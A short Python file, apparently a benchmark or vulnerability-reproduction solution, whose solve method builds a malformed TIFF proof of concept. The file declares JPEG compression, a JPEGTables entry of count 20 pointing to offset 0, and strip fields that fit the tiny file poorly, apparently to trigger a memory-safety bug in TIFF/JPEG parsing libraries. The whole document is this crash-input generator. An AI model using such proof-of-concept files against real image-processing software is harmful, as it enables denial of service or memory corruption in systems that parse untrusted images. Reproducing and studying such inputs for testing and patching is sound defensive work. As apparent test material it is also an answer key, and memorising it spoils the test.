import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        tags = [
            (256, 3, 1, 4),   # ImageWidth
            (257, 3, 1, 7),   # ImageLength
            (258, 3, 1, 8),   # BitsPerSample
            (259, 4, 1, 7),   # Compression (JPEG)
            (262, 3, 1, 1),   # PhotometricInterpretation
            (277, 3, 1, 1),   # SamplesPerPixel
            (278, 4, 1, 7),   # RowsPerStrip
            (273, 4, 1, 134), # StripOffsets
            (279, 4, 1, 28),  # StripByteCounts
            (347, 7, 20, 0),  # JPEGTables (UNDEFINED, count=20 >4, offset=0)
        ]
        header = struct.pack('<HHI', 0x4949, 42, 8)
        num_tags = len(tags)
        ifd_num = struct.pack('<H', num_tags)
        ifd_tags = b''.join(struct.pack('<HHII', tid, typ, cnt, val) for tid, typ, cnt, val in tags)
        next_ifd = struct.pack('<I', 0)
        ifd = ifd_num + ifd_tags + next_ifd
        data = b'\x00' * 28
        poc = header + ifd + data
        return poc